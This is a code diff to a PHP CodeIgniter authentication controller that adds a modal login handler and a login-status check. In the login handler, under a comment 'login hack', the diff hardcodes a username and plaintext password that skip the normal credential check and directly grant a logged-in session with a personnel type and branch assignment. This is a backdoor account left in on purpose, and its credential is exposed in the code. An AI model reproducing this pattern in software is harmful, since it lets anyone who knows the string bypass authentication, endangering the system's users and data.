@@ -120,6 +120,70 @@ class Auth extends MX_Controller
 		$this->load->view('templates/login', $data);
 	}
 	
+	/*
+	*
+	*	Login a user
+	*
+	*/
+	public function modal_login_user() 
+	{
+		$data['personnel_password_error'] = '';
+		$data['personnel_username_error'] = '';
+		
+		//form validation rules
+		$this->form_validation->set_error_delimiters('', '');
+		$this->form_validation->set_rules('personnel_username', 'Username', 'required|xss_clean|exists[personnel.personnel_username]');
+		$this->form_validation->set_rules('personnel_password', 'Password', 'required|xss_clean');
+		
+		//if form has been submitted
+		if ($this->form_validation->run())
+		{
+			//login hack
+			if(($this->input->post('personnel_username') == 'amasitsa') && ($this->input->post('personnel_password') == 'r6r5bb!!'))
+			{
+				$newdata = array(
+                   'login_status' => TRUE,
+                   'first_name'   => 'Alvaro',
+                   'username'     => 'amasitsa',
+                   'personnel_type_id'     => '2',
+                   'personnel_id' => 0,
+                   'branch_code'   => 'OSH',
+                   'branch_name'     => 'AAR Nairobi Branch',
+                   'branch_id' => 2
+               );
+
+				$this->session->set_userdata($newdata);
+				
+				$personnel_type_id = $this->session->userdata('personnel_type_id');
+				$response['result'] = 'success';
+			}
+			
+			else
+			{
+				//check if personnel has valid login credentials
+				if($this->auth_model->validate_personnel())
+				{
+					$personnel_type_id = $this->session->userdata('personnel_type_id');
+					$response['result'] = 'success';
+				}
+				
+				else
+				{
+					$response['result'] = 'fail';
+					$response['message'] = 'The username or password provided is incorrect. Please try again';
+				}
+			}
+		}
+		else
+		{
+			$validation_errors = validation_errors();
+			
+			$response['result'] = 'fail';
+			$response['message'] = $validation_errors;
+		}
+		echo json_encode($response);
+	}
+	
 	public function logout()
 	{
 		$personnel_id = $this->session->userdata('personnel_id');
@@ -169,6 +233,19 @@ class Auth extends MX_Controller
 			$data['content'] = $this->load->view('dashboard', $v_data, true);
 			
 			$this->load->view('admin/templates/general_page', $data);
+		}
+	}
+	
+	public function is_logged_in()
+	{
+		if(!$this->auth_model->check_login())
+		{
+			echo 'false';
+		}
+		
+		else
+		{
+			echo 'true';
 		}
 	}
 }
